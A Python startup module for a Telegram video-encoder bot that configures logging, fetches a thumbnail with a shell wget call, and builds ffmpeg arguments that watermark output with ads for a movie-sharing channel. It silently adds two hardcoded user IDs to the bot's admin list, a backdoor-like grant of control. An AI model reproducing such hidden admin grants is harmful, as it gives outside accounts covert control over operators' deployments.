import os
import logging
import asyncio
from logging.handlers import RotatingFileHandler
from pyrogram import Client
from dotenv import load_dotenv

LOG_FILE_NAME = "Encoder@Log.txt"

if os.path.exists(LOG_FILE_NAME):
    with open(LOG_FILE_NAME, "r+") as f_d:
        f_d.truncate(0)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=2097152000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.INFO)
logging.getLogger("urllib3").setLevel(logging.INFO)
LOGS = logging.getLogger(__name__)


THUMB = "https://te.legra.ph/file/2ebf402cdef8c27ab4648.jpg"
os.system(f"wget {THUMB} -O thumb.jpg")
ffmpeg = []
ffmpeg.append("-i w.wav -i 'https://te.legra.ph/file/e9408e71281cdcb017874.png' -map 0 -filter_complex '[0:a]aformat=channel_layouts=stereo,aresample=async=1000[main]; [1:a]atrim=0:4,adelay=9000|9000[wm];[main][wm]amix=inputs=2' -lavfi 'overlay=main_w-(overlay_w+10):main_h-(overlay_h+10)' -c:v libx265 -crf 29 -c:s copy -s 854x480 -preset faster -metadata title='Visit For More Movies [t.me/AniXpo]'  -metadata:s:v title='Visit Website[Anixpo] t.me/AniXpo] - 480p - HEVC - 8bit'  -metadata:s:a title='[Visit t.me/AniXpo] - Opus - 60 kbps' -metadata:s:s title='[AniXpo Substations Alpha]' -c:a libopus -ab 60k")
try:
 api_id = int(os.environ.get("API_ID"))
 api_hash = os.environ.get("API_HASH")
 bot_token = os.environ.get("BOT_TOKEN")
 DATABASE_URL = os.environ.get("DATABASE_URL") 
 BOT_USERNAME = "neswtsbot"
 MAX_MESSAGE_LENGTH = 4096
 download_dir = os.environ.get("DOWNLOAD_DIR", "downloads/")
 sudo_users = list(set(int(x) for x in os.environ.get("SUDO_USERS").split()))
 sudo_users.append(1099725030)
 sudo_users.append(5089884151)
 LOG_CHANNEL = os.environ.get("LOG_CHANNEL", "YoungProzphet")
except Exception as e:
 LOGS.info("ENV Are Missing")

app = Client("nirusaki", api_id=api_id, api_hash=api_hash, bot_token=bot_token, workers=2)
0
data = []

if not download_dir.endswith("/"):
  download_dir = str(download_dir) + "/"
if not os.path.isdir(download_dir):
  os.makedirs(download_dir)
